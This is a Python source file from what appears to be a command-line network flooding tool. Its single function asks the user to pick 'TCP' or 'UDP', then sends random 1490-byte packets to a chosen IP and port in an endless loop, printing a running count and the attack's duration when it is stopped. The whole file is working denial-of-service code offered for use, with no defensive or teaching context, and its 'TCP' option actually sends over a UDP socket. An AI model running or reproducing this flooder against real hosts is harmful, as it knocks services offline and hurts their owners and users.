import os, sys, socket, random, time
from src import print_slow, banner
from colorama import Fore

def clean():
    os.system("clear")

def flood(ip, port):
    try:
        method = 0
        print_slow.slow_type("\n\n  Enter the attack method: \n\n\n 1. TCP\n\n 2. UDP\n\n")
        while(method < 1 or method > 2):
            method = int(input("\n ==> "))
        clean()
        banner.flood()
        try:
            print_slow.slow_type(Fore.BLUE + "\n\n[Flooding " + ip + ":" + str(port) + "]\nPress ctrl+c to stop the attack\n\n" + Fore.RESET)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            cnt = 0
            bytes = random._urandom(1490)
            attackStart = time.time()
            if method == 1:
                s.connect((ip, port))
                while True:
                    s.send(bytes)
                    cnt += 1
                    if cnt % 5000 == 0:
                        print(Fore.RED + str(cnt) + " sockets sent" + Fore.RESET)
            else:
                while True:
                    s.sendto(bytes, (ip, port))
                    cnt +=1
                    if cnt % 5000 == 0:
                        print(Fore.RED + str(cnt) + " sockets sent" + Fore.RESET)
        except KeyboardInterrupt:
            attackEnd = time.time()
            attackEnd = attackEnd-attackStart
            print(Fore.CYAN + "\n\n----------------------------------------\n  SOCKETS SENT: " + str(cnt) + "  TIME: " + str(int(attackEnd)) + " sec\n----------------------------------------\n" + Fore.RESET + "\n\nPress enter to continue...")
            input()
            s.close()
        except socket.error:
            print(Fore.RED + "\n[Error 10]" + Fore.RESET)
            sys.exit()
        except ConnectionRefusedError:
            print(Fore.RED + "\n[Error 11]" + Fore.RESET + "\n\nPress enter to continue...")
            input()
        except:
            print(Fore.RED + "\n[Error 404]" + Fore.RESET)
            sys.exit()
    except SystemExit:
        sys.exit()
    except KeyboardInterrupt:
        print(Fore.BLUE + "\n[WARNING] Keyboard Interrupt rilevated, exiting...")
    except:
        print(Fore.RED + "\n[Error 404]" + Fore.RESET)
        sys.exit()